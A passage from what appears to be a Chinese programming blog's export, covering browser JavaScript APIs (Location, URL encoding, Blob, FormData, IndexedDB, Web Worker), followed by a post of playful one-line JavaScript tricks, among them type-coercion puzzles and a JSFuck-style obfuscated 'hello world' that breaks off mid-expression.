的路径部分，从根路径/开始 // "/path/a.html"document.location.search 查询字符串部分，从问号?开始。 // "?x=111"document.location.hash 片段字符串部分，从#开始。 // "#part1"document.location.username 域名前面的用户名 // "user"document.location.password 域名前面的密码 // "passwd"document.location.origin URL 的协议、主机名和端口 只读，其他属性都可写 // "http://user:passwd@www.example.com:4097" location.origin 只有改属性是只读的，其他属性都可写。Location.href属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口（比如子窗口与父窗口）的Location.href属性，导致后者的网址跳转。直接改写location，相当于写入href属性。 URL 的编码和解码网页的 URL 只能包含合法的字符。合法字符分成两类。URL 元字符：分号（;），逗号（,），斜杠（/），问号（?），冒号（:），at（@），&amp;，等号（=），加号（+），美元符号（$），井号（#）语义字符：a-z，A-Z，0-9，连词号（-），下划线（_），点（.），感叹号（!），波浪线（~），星号（*），单引号（’），圆括号（()）除了以上字符，其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（%）加上两个大写的十六进制字母。 JavaScript 提供四个 URL 的编码/解码方法。 encodeURI()用于转码整个 URL。它的参数是一个字符串，代表整个 URL。它会将元字符和语义字符之外的字符，都进行转义。 encodeURIComponent()用于转码 URL 的组成部分，会转码除了语义字符之外的所有字符，即元字符也会被转码。所以，它不能用于转码整个 URL。它接受一个参数，就是 URL 的片段。 decodeURI()用于整个 URL 的解码。它是encodeURI()方法的逆运算。它接受一个参数，就是转码后的 URL。 decodeURIComponent()用于URL 片段的解码。它是encodeURIComponent()方法的逆运算。它接受一个参数，就是转码后的 URL 片段。 ArrayBuffer 对象 和 Blob 对象 ArrayBuffer 对象ArrayBuffer 对象表示一段二进制数据，用来模拟内存里面的数据。通过这个对象，JavaScript 可以读写二进制数据。这个对象可以看作内存数据的表达。 浏览器原生提供ArrayBuffer()构造函数，用来生成实例。它接受一个整数作为参数，表示这段二进制数据占用多少个字节。 var buffer = new ArrayBuffer(8); 实例对象buffer占用8个字节。 ArrayBuffer 对象有实例方法slice()，用来复制一部分内存 Blob 对象Blob (Binary Large Object)二进制大型对象，表示一个二进制文件的数据内容，比如一个图片文件的内容就可以通过 Blob 对象读写。它通常用来读写文件。它与 ArrayBuffer 的区别在于，它用于操作二进制文件，而 ArrayBuffer 用于操作内存。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768// 浏览器原生提供Blob()构造函数，用来生成实例对象。new Blob(array [, options])// Blob构造函数接受两个参数。第一个参数是数组，成员是字符串或二进制对象，表示新生成的Blob实例对象的内容；第二个参数是可选的，是一个配置对象，目前只有一个属性type，它的值是一个字符串，表示数据的 MIME 类型，默认是空字符串。// Blob具有两个实例属性size和type，分别返回数据的大小和类型。var htmlFragment = ['&lt;a id="a"&gt;&lt;b id="b"&gt;hey!&lt;/b&gt;&lt;/a&gt;'];var myBlob = new Blob(htmlFragment, &#123;type : 'text/html'&#125;);myBlob.size // 32myBlob.type // "text/html"// Blob具有一个实例方法slice，用来拷贝原来的数据，返回的也是一个Blob实例。myBlob.slice(start，end, contentType)// 三个可选参数。起始的字节位置（默认为0）、结束的字节位置（默认为size属性的值，该位置本身将不包含在拷贝的数据之中）、新实例的数据类型（默认为空字符串）。// 下载文件// AJAX 请求时，如果指定responseType属性为blob，下载下来的就是一个 Blob 对象。function getBlob(url, callback) &#123; var xhr = new XMLHttpRequest(); xhr.open('GET', url); xhr.responseType = 'blob'; xhr.onload = function () &#123; callback(xhr.response); &#125; xhr.send(null);&#125;// 上面代码中，xhr.response拿到的就是一个 Blob 对象。// 生成 URL // 浏览器允许使用URL.createObjectURL()方法，针对 Blob 对象生成一个临时 URL，以便于某些 API 使用。这个 URL 以blob://开头，表明对应一个 Blob 对象，协议头后面是一个识别符，用来唯一对应内存里面的 Blob 对象。这一点与data://URL（URL 包含实际数据）和file://URL（本地文件系统里面的文件）都不一样。// 浏览器处理 Blob URL 就跟普通的 URL 一样，如果 Blob 对象不存在，返回404状态码；如果跨域请求，返回403状态码。Blob URL 只对 GET 请求有效，如果请求成功，返回200状态码。由于 Blob URL 就是普通 URL，因此可以下载。// 读取文件// 取得 Blob 对象以后，可以通过FileReader对象，读取 Blob 对象的内容，即文件内容。// FileReader 对象提供四个方法，处理 Blob 对象。Blob 对象作为参数传入这些方法，然后以指定的格式返回。FileReader.readAsText()：返回文本，需要指定文本编码，默认为 UTF-8。FileReader.readAsArrayBuffer()：返回 ArrayBuffer 对象。FileReader.readAsDataURL()：返回 Data URL。FileReader.readAsBinaryString()：返回原始的二进制字符串// 下面是FileReader.readAsArrayBuffer()方法的例子，用于读取二进制文件。&lt;input type="file" onchange="typefile(this.files[0])"&gt;&lt;/input&gt;function typefile(file) &#123; // 文件开头的四个字节，生成一个 Blob 对象 var slice = file.slice(0, 4); var reader = new FileReader(); // 读取这四个字节 reader.readAsArrayBuffer(slice); reader.onload = function (e) &#123; var buffer = reader.result; // 将这四个字节的内容，视作一个32位整数 var view = new DataView(buffer); var magic = view.getUint32(0, false); // 根据文件的前四个字节，判断它的类型 switch(magic) &#123; case 0x89504E47: file.verified_type = 'image/png'; break; case 0x47494638: file.verified_type = 'image/gif'; break; case 0x25504446: file.verified_type = 'application/pdf'; break; case 0x504b0304: file.verified_type = 'application/zip'; break; &#125; console.log(file.name, file.verified_type); &#125;;&#125; FormData 对象表单数据以键值对的形式向服务器发送，这个过程是浏览器自动完成的。但是有时候，我们希望通过脚本完成过程，构造和编辑表单键值对，然后通过XMLHttpRequest.send()方法发送。浏览器原生提供了 FormData 对象来完成这项工作。123456789// FormData 首先是一个构造函数，用来生成实例。参数是一个表单元素，这个参数是可选的。如果省略参数，就表示一个空的表单，否则就会处理表单元素里面的键值对。var formdata = new FormData(form);// 示例var myForm = document.getElementById('myForm');var formData = new FormData(myForm);// 设置、获取某个控件的值formData.set('username', '张三');formData.get('username') // "张三" 实例方法FormData 提供以下实例方法。FormData.get(key)：获取指定键名对应的键值，参数为键名。如果有多个同名的键值对，则返回第一个键值对的键值。FormData.getAll(key)：返回一个数组，表示指定键名对应的所有键值。如果有多个同名的键值对，数组会包含所有的键值。FormData.set(key, value)：设置指定键名的键值，参数为键名。如果键名不存在，会添加这个键值对，否则会更新指定键名的键值。如果第二个参数是文件，还可以使用第三个参数，表示文件名。FormData.delete(key)：删除一个键值对，参数为键名。FormData.append(key, value)：添加一个键值对。如果键名重复，则会生成两个相同键名的键值对。如果第二个参数是文件，还可以使用第三个参数，表示文件名。FormData.has(key)：返回一个布尔值，表示是否具有该键名的键值对。FormData.keys()：返回一个遍历器对象，用于for…of循环遍历所有的键名。FormData.values()：返回一个遍历器对象，用于for…of循环遍历所有的键值。FormData.entries()：返回一个遍历器对象，用于for…of循环遍历所有的键值对。如果直接用for…of循环遍历 FormData 实例，默认就会调用这个方法。 文件上传用户上传文件，也是通过表单。具体来说，就是通过文件输入框选择本地文件，提交表单的时候，浏览器就会把这个文件发送到服务器。 此外，还需要将表单 form 元素的method属性设为POST，enctype属性设为multipart/form-data。其中，enctype属性决定了 HTTP 头信息的Content-Type字段的值，默认情况下这个字段的值是application/x-www-form-urlencoded，但是文件上传的时候要改成multipart/form-data。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;input type="file" id="file" name="myFile" /&gt;&lt;form method="post" enctype="multipart/form-data"&gt; &lt;div&gt; &lt;label for="file"&gt;选择一个文件&lt;/label&gt; &lt;input type="file" id="file" name="myFile" multiple /&gt; &lt;/div&gt; &lt;div&gt; &lt;input type="submit" id="submit" name="submit_button" value="上传" /&gt; &lt;/div&gt;&lt;/form&gt;// 上面的 HTML 代码中，file 控件的multiple属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。var fileSelect = document.getElementById('file');var files = fileSelect.files;// 然后，新建一个 FormData 实例对象，模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。var formData = new FormData();for (var i = 0; i &lt; files.length; i++) &#123; var file = files[i]; // 只上传图片文件 if (!file.type.match('image.*')) &#123; continue; &#125; formData.append('photos[]', file, file.name);&#125;// 最后，使用 Ajax 向服务器上传文件。var xhr = new XMLHttpRequest();xhr.open('POST', 'handler.php', true);xhr.onload = function () &#123; if (xhr.status !== 200) &#123; console.log('An error occurred!'); &#125;&#125;;xhr.send(formData);// 除了发送 FormData 实例，也可以直接 AJAX 发送文件。var file = document.getElementById('test-input').files[0];var xhr = new XMLHttpRequest();xhr.open('POST', 'myserver/uploads');xhr.setRequestHeader('Content-Type', file.type);xhr.send(file); IndexedDB现有的浏览器数据储存方案，都不适合储存大量数据：Cookie 的大小不超过 4KB，且每次请求都会发送回服务器；LocalStorage 在 2.5MB 到 10MB 之间（各家浏览器不同），而且不提供搜索功能，不能建立自定义的索引。所以，需要一种新的解决方案，这就是 IndexedDB 诞生的背景。 IndexedDB 就是浏览器提供的本地数据库，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。 IndexedDB 具有以下特点。（1）键值对储存。 IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以“键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。（2）异步。 IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。（3）支持事务。 IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。（4）同源限制 IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。（5）储存空间大 IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。（6）支持二进制储存。 IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象） IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。数据库：IDBDatabase 对象对象仓库：IDBObjectStore 对象索引： IDBIndex 对象事务： IDBTransaction 对象操作请求：IDBRequest 对象指针： IDBCursor 对象主键集合：IDBKeyRange 对象123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117// 打开数据库，使用 IndexedDB 的第一步是打开数据库，使用indexedDB.open()方法。var request = window.indexedDB.open(databaseName, version);// 这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为1。// indexedDB.open()方法返回一个 IDBRequest 对象。这个对象通过三种事件error、success、upgradeneeded，处理打开数据库的操作结果。// 新建数据库，与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在upgradeneeded事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。request.onupgradeneeded = function (event) &#123; db = event.target.result; var objectStore; if (!db.objectStoreNames.contains('person')) &#123; objectStore = db.createObjectStore('person', &#123; keyPath: 'id' &#125;); &#125;&#125;// 新建对象仓库以后，下一步可以新建索引。request.onupgradeneeded = function(event) &#123; db = event.target.result; var objectStore = db.createObjectStore('person', &#123; keyPath: 'id' &#125;); objectStore.createIndex('name', 'name', &#123; unique: false &#125;); objectStore.createIndex('email', 'email', &#123; unique: true &#125;);&#125;// 新增数据，指的是向对象仓库写入数据记录。这需要通过事务完成。function add() &#123; var request = db.transaction(['person'], 'readwrite') .objectStore('person') .add(&#123; id: 1, name: '张三', age: 24, email: 'zhangsan@example.com' &#125;); request.onsuccess = function (event) &#123; console.log('数据写入成功'); &#125;; request.onerror = function (event) &#123; console.log('数据写入失败'); &#125;&#125;add();// 上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过IDBTransaction.objectStore(name)方法，拿到 IDBObjectStore 对象，再通过表格对象的add()方法，向表格写入一条记录。写入操作是一个异步操作，通过监听连接对象的success事件和error事件，了解是否写入成功。// 读取数据，也是通过事务完成。function read() &#123; var transaction = db.transaction(['person']); var objectStore = transaction.objectStore('person'); var request = objectStore.get(1); // objectStore.get()方法用于读取数据，参数是主键的值。 request.onerror = function(event) &#123; console.log('事务失败'); &#125;; request.onsuccess = function( event) &#123; if (request.result) &#123; console.log('Name: ' + request.result.name); console.log('Age: ' + request.result.age); console.log('Email: ' + request.result.email); &#125; else &#123; console.log('未获得数据记录'); &#125; &#125;;&#125;read();// 遍历数据，表格的所有记录，要使用指针对象 IDBCursor。function readAll() &#123; var objectStore = db.transaction('person').objectStore('person'); objectStore.openCursor().onsuccess = function (event) &#123; var cursor = event.target.result; if (cursor) &#123; console.log('Id: ' + cursor.key); console.log('Name: ' + cursor.value.name); console.log('Age: ' + cursor.value.age); console.log('Email: ' + cursor.value.email); cursor.continue(); &#125; else &#123; console.log('没有更多数据了！'); &#125; &#125;;&#125;readAll();// 更新数据,要使用IDBObject.put()方法function update() &#123; var request = db.transaction(['person'], 'readwrite') .objectStore('person') .put(&#123; id: 1, name: '李四', age: 35, email: 'lisi@example.com' &#125;); request.onsuccess = function (event) &#123; console.log('数据更新成功'); &#125;; request.onerror = function (event) &#123; console.log('数据更新失败'); &#125;&#125;update();// 删除数据，IDBObjectStore.delete()方法用于删除记录。function remove() &#123; var request = db.transaction(['person'], 'readwrite') .objectStore('person') .delete(1); request.onsuccess = function (event) &#123; console.log('数据删除成功'); &#125;;&#125;remove(); Web WorkerJavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。 Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务可以交由 Worker 线程执行，主线程（通常负责 UI 交互）能够保持流畅，不会被阻塞或拖慢。 Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。 Web Worker 有以下几个使用注意点。（1）同源限制。分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。（2）DOM 限制。Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用document、window、parent这些对象。但是，Worker 线程可以使用navigator对象和location对象。（3）全局对象限制。Worker 的全局对象WorkerGlobalScope，不同于网页的全局对象Window，很多接口拿不到。比如，理论上 Worker 线程不能使用console.log，因为标准里面没有提到 Worker 的全局对象存在console接口，只定义了Navigator接口和Location接口。不过，浏览器实际上支持 Worker 线程使用console.log，保险的做法还是不使用这个方法。（4）通信联系。Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。（5）脚本限制。Worker 线程不能执行alert()方法和confirm()方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。（6）文件限制。Worker 线程无法读取本地文件，即不能打开本机的文件系统（file://），它所加载的脚本，必须来自网络。 12345678910111213141516// 浏览器原生提供Worker()构造函数，用来供主线程生成 Worker 线程。var myWorker = new Worker(jsUrl, options);// Worker()构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。// 主线程var myWorker = new Worker('worker.js', &#123; name : 'myWorker' &#125;);// Worker 线程self.name // myWorkerWorker()构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。Worker.onerror：指定 error 事件的监听函数。Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在Event.data属性中。Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。Worker.postMessage()：向 Worker 线程发送消息。Worker.terminate()：立即终止 Worker 线程]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一行能装逼的JS代码]]></title>
    <url>%2F2019%2F02%2F19%2FJS%2F%E4%B8%80%E8%A1%8C%E8%83%BD%E8%A3%85%E9%80%BC%E7%9A%84JS%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[你看不懂是你SB，我写的代码就要牛逼。 1、单行写一个评级组件1"★★★★★☆☆☆☆☆".slice(5 - rate, 10 - rate) 定义一个变量rate是1到5的值，然后执行上面代码。rate是1，就是1星。 2、如何装逼用代码骂别人sb1(!(~+[])+&#123;&#125;)[--[~+""][+[]]*[~+[]] + ~~!+[]]+(&#123;&#125;+[])[[~!+[]]*~+[]] JS运算符的优先级、JS的类型转化强制转换: String(sth)成字符串和调用 sth.toString() 方法的唯一不同之处在于，对null和undefined值强制类型转换可以生成字符串而不引发错误。 3、如何用代码优雅的证明自己nb1([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]] 4、JavaScript 错误处理的方式的正确姿势12345try &#123; something&#125; catch (e) &#123; window.location.href = "http://stackoverflow.com/search?q=[js]+" + e.message;&#125; 5、论如何优雅的取整 123456789// 位运算只对整数有效，遇到小数时，会将小数部分舍去，只保留整数部分。所以，将一个小数与0进行二进制或运算，等同于对该数去除小数部分，即取整数位。// 需要注意的是，这种取整方法不适用超过32位整数最大值2147483647的数。a | 0 // 口诀: 一个数与自身的取反值相加，等于-1// 对一个整数连续两次二进制否运算，得到它自身// 所有的位运算都只对整数有效。二进制否运算遇到小数时，也会将小数部分舍去，只保留整数部分// 所以，对一个小数连续进行 两次取反，能达到取整效果，而且性能取整最快~~a === 0 | a === a ^ 0 === a &gt;&gt; 0 === parseInt(a, 10) 6、从一行代码里面学点JavaScript1234567[].forEach.call($$("*"),function(a)&#123; a.style.outline="1px solid #"+(~~(Math.random()*(1&lt;&lt;24))).toString(16)&#125;)// 等价于Array.prototype.forEach.call(document.querySelectorAll('*'), dom =&gt; dom.style.outline = `1px solid #$&#123;parseInt(Math.random() * Math.pow(2,24)).toString(16)&#125;`) 解析 document.all 返回所有的dom, 获得文档元素内所有 HTML 标记的集合 document.all(0) 返回第一个元素 $$(‘a’) ,即document.querySelectorAll(‘a’)，返回当前页面中所有锚元素的列表 &lt;&lt;，有符号左移位，将运算数的二进制整体左移指定位数，低位用0补齐。 number.toString(radix)，把number按radix进制转换成字符串。radix基数默认为10。 如(6).toString(2) 为 “110” parseInt(string, radix)，解析一个字符串string，以radix进制为基础返回一个整数。radix基数默认为10。 如parseInt(“11”,2)返回3 (2+1) parseInt(“ffffff”, 16) == 16777215 == 1000000000000000000000000 == 2^24-1 == 1&lt;&gt; 0 Math.random() 返回一个[0, 1)之间的随机数 Math.floor(num) 向下取整，返回小于或等于num的最大整数，即返回num的整数部分 Math.round(num) 四舍五入，返回num四舍五入后的整数 Math.ceil(num) 向上取整，返回大于等于num的最小整数 Math.floor(Math.random()*(max - min + 1) + min) 返回[min, max]之间的随机数 7、论如何优雅的取随机字符串123Math.random().toString(16).substring(2) // "7fdc07173c74c"Math.random().toString(36).substring(2) // "v8yaf0xdv5c" str.substr(start,length) 在字符串中抽取从 start 下标开始的指定长度的字符。不建议使用。str.substring(start,stop) 提取字符串中介于两个下标 [start,stop)之间的字符。与slice()和substr()方法不同，substring()不接受负的参数str.slice(start,end) 提取字符串的某个部分，并以新的字符串返回被提取的部分 [start,stop) 8、js奇淫技巧 特殊转换123456789101112131415161718(10)["toString"]() === "10" // trueString([]) === "" []进行字符串转换得到结果为""String(&#123;&#125;) === "[object Object]" &#123;&#125;进行字符串转换得到结果为"[object Object]"![] ===!"" === false !后面的字符会被转为换布尔 +[] === +"" === 0 +后面的字符会被转换为数值 !+[] === truetrue+[] === "true"[]+[]=== "" [] 后面跟的字符会被转换为字符串 ![]+[] === "false"+!![] === 1 "hello"[0] == "h" 检索字符串 +("1"+"1") === 11 多个数字通过添加字符串表示在一起，然后整个表达式转换为数值类型 (![]+[])[+!![]] === "a" 等价于 "false"[1] [][[]] + [] === "undefined"// JavaScript的一个重要的特性是一个对象的属性可以通过点符号.或方括号[]访问。我们可以使用方括号代替点符号调用这些方法。(10)["toString"]() === (10).toString() === (10).toString(10) === "10" 9、另外一种undefinedvoid在JavaScript中是一个操作符，对传入的操作不执行并且返回undefined，但不建议这样写，因void 影响性能12345// 以下几种等价var datavar data = undefinedvar data = void 0var data = void(0) 10、实现金钱格式化1234567891011121314// 正则var money = '1234567890'money.replace(/\B(?=(\d&#123;3&#125;)+(?!\d))/g, ',') // 1,234,567,890// reducefunction formatCash(str) &#123; return str.split('').reverse().reduce((prev, next, index) =&gt; &#123; return ((index % 3) ? next : (next + ',')) + prev &#125;)&#125;formatCash(money) // 1,234,567,890// numObj.toLocaleString([locales [, options]]) 注意为 number类型(1234567890).toLocaleString('en', &#123; style: 'decimal', currency: 'USD' &#125;) Number.prototype.toLocaleString([locales [, options]])locales 参数用于指定格式化对象时使用的语言环境，默认为当前环境的语言，可以不传。style 表示格式化时使用的样式，默认值是 decimal 纯数字，也可为 percent 百分比显示与 currency 货币显示。style 设为 currency 时，必须同时指定currency 属性，否则报错。currency指定对应的货币，如 USD 、 EUR 与 CNY 等，不区分大小写。此外，还可以设置currencyDisplay指定货币符号的展示样式，默认值是 symbol即对应的符号，如 CNY 是 ￥。该属性的值也可以是 code 与 name. 以下，控制有效数字位数以及整数、小数位数，都是四舍五入。minimumSignificantDigits：控制有效数字最少位数，设置后minimumIntegerDigits等属性会被忽略maximumSignificantDigits：控制有效数字最多位数，设置后minimumIntegerDigits等属性会被忽略useGrouping: true 有分隔符 minimumIntegerDigits: 指定整数最少位数，不够则用0去凑，即自动补0minimumFractionDigits: 指定小数最少位数，不够则用0去凑，即自动补0maximumFractionDigits: 指定小数最多位数 如，(2333.3).toLocaleString(‘zh’, { minimumFractionDigits: 2, minimumIntegerDigits:4, useGrouping: false }); //2333.30 Date.prototype.toLocaleString([locales [, options]])hour12: true 使用十二小时制weekday 、 era均可以取值为 narrow尽量短 、 short缩写 或 long正常。year 、 month 、 day 、 hour 、 minute 、 second 与 timeZoneName，均可以取值为 numeric 与 2-digit ，是否仅用两位数字表示 如， 11、连等1234var a = b = 3//等价于 从右向左 b = 3var a = b 12、如何最佳的让两个整数交换数值12345678910// 常规方法 缺点是整型数据溢出，对于32位字符最大表示数字是2147483647，如果是2147483645和2147483646交换就失败了var a = 1, b = 2a += bb = a - ba -= b;// 异或运算 有一个特殊运用，连续对两个数a和b进行三次异或运算，可以互换它们的值。这意味着，使用“异或运算”可以在不引入临时变量的前提下，互换两个变量的值。a ^= bb ^= aa ^= b 13、实现标准JSON的深拷贝1JSON.parse(JSON.stringify(obj)) 原理: 利用JSON.stringify() 将js对象序列化（JSON字符串），再使用JSON.parse来反序列化(还原)js对象。序列化的作用是存储(对象本身存储的只是一个地址映射，如果断电，对象将不复存在，因此需将对象的内容转换成字符串的形式再保存在磁盘上 )和传输（例如 如果请求的Content-Type是 application/x-www-form-urlencoded，则前端这边需要使用qs.stringify(data)来序列化参数再传给后端，否则后端接受不到；Content-Type 为 application/json;charset=UTF-8或者 multipart/form-data 则可以不需要）。在使用 JSON.parse(JSON.stringify(obj))时应该注意一下几点：如果obj里面有时间对象，则JSON.stringify后再JSON.parse的结果，时间将只是字符串的形式。而不是时间对象；如果obj里有RegExp、Error对象，则序列化的结果将只得到空对象;如果obj里有函数，undefined，则序列化的结果会把函数或 undefined丢失；如果obj里有NaN、Infinity和-Infinity，则序列化的结果会变成null;JSON.stringify()只能序列化对象的可枚举的自有属性，如果obj中的对象是有构造函数生成的，深拷贝后，会丢弃对象的constructor；如果对象中存在循环引用的情况也无法正确实现深拷贝。 14、写出 hello world!1([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[+[]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[